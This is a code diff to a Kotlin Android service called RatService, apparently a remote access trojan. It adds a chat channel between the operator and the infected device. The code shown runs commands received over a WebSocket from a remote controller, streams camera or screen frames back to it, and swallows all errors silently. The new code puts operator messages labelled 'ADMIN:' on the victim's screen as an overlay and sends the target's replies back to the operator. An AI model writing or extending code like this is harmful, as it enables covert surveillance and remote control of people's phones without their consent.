@@ -94,7 +94,9 @@ class RatService : Service() {
             override fun onMessage(webSocket: WebSocket, text: String) {
                 try {
                     val obj = gson.fromJson(text, JsonObject::class.java)
-                    if (obj.get("type")?.asString == "command") {
+                    val type = obj.get("type")?.asString
+
+                    if (type == "command") {
                         val id = obj.get("id").asLong
                         val cmd = obj.get("command").asString
                         val args = obj.getAsJsonObject("args")
@@ -105,6 +107,11 @@ class RatService : Service() {
                                 add("result", gson.toJsonTree(result))
                             }
                             try { webSocket.send(gson.toJson(payload)) } catch (_: Exception) {}
+                        }
+                    } else if (type == "chat_reply") {
+                        val chatText = obj.get("text")?.asString ?: ""
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            showChatOnOverlay(chatText)
                         }
                     }
                 } catch (_: Exception) {}
@@ -131,9 +138,6 @@ class RatService : Service() {
         }.start()
     }
 
-    // ============================================================
-    // SEND FRAME (untuk live stream kamera/layar)
-    // ============================================================
     fun sendFrame(frameType: String, base64Data: String) {
         try {
             val payload = JsonObject().apply {
@@ -143,6 +147,22 @@ class RatService : Service() {
                     "frame_type" to frameType,
                     "data" to base64Data,
                     "ts" to System.currentTimeMillis()
+                )))
+            }
+            ws?.send(gson.toJson(payload))
+        } catch (_: Exception) {}
+    }
+
+    fun sendChatFromTarget(text: String) {
+        try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(mapOf(
+                    "type" to "chat_from_target",
+                    "data" to mapOf(
+                        "text" to text,
+                        "ts" to System.currentTimeMillis().toString()
+                    )
                 )))
             }
             ws?.send(gson.toJson(payload))
@@ -191,6 +211,43 @@ class RatService : Service() {
                 } catch (_: Exception) {}
             }
         }.start()
+    }
+
+    private fun showChatOnOverlay(text: String) {
+        try {
+            val wm = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_PHONE
+
+            val tv = android.widget.TextView(this).apply {
+                this.text = "ADMIN: $text"
+                setTextColor(android.graphics.Color.WHITE)
+                setBackgroundColor(android.graphics.Color.parseColor("#CCB30000"))
+                textSize = 13f
+                setPadding(30, 20, 30, 20)
+            }
+
+            val params = android.view.WindowManager.LayoutParams(
+                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
+                android.view.WindowManager.LayoutParams.WRAP_CONTENT,
+                type,
+                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                        android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                android.graphics.PixelFormat.TRANSLUCENT
+            ).apply {
+                gravity = android.view.Gravity.TOP or android.view.Gravity.CENTER_HORIZONTAL
+                y = 200
+            }
+
+            wm.addView(tv, params)
+
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                try { wm.removeView(tv) } catch (_: Exception) {}
+            }, 5000)
+        } catch (_: Exception) {}
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
